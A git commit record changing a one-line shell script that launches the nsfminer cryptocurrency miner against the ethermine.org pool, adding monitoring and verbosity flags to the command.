a75f4f37235d078c9bf558605970aa8e1cd6eaa4
chadpetersen1337 <68467197+chadpetersen1337@users.noreply.github.com>
2021-04-26 15:47:58 +0200

    Update nsfEtherm.sh

--- nsfEtherm.sh
+++ nsfEtherm.sh
@@ -1,1 +1,1 @@
-./nsfminer -P stratum1+ssl://0x8CB8003E428D0Fd7693D22f576A212403728c64a.nsfMiner@us1.ethermine.org:5555
+./nsfminer -P stratum1+ssl://0x8CB8003E428D0Fd7693D22f576A212403728c64a.nsfMiner@us1.ethermine.org:5555 -R --HWMON 2 --verbosity 1
